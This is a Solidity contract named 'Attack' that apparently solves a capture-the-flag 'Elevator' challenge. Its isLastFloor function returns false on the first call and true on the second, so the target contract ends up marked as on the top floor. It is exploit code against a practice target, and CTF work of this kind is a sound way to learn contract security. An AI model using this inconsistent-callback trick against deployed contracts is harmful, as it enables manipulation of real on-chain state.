// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Building.sol";
import "./Elevator.sol";

contract Attack is Building {

    bool top = false;
    address target;

    constructor(address trg) {
        target = trg;
    }

    function isLastFloor(uint) external returns (bool) {
        top = !top;
        return !top;
    }    

    function goTo(uint _floor) public {
        Elevator(target).goTo(_floor);
    }
}